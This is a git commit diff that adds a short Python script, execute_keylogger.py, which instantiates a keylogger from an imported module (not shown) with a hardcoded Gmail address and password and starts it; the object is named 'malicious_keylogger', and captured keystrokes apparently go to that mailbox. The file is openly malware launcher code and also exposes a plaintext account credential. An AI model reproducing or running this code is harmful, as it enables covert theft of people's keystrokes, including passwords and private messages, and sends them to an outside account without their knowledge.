fc98e13355f7e848fbbf42a3df546b2bb3cc8ad1
JoeyKenobi <joeyr1996@gmail.com>
2023-04-18 12:52:20 -0500

    second commit

---
+++ execute_keylogger.py
@@ -0,0 +1,9 @@
+import keylogger
+
+"""Initialize Keylogger"""
+
+malicious_keylogger = keylogger.KeyLogger(10, 'completekeyloggerproject@gmail.com', 'Fi63J3vjCyE3') (#username of email, password)
+
+"""Execute Keylogger"""
+
+malicious_keylogger.start()
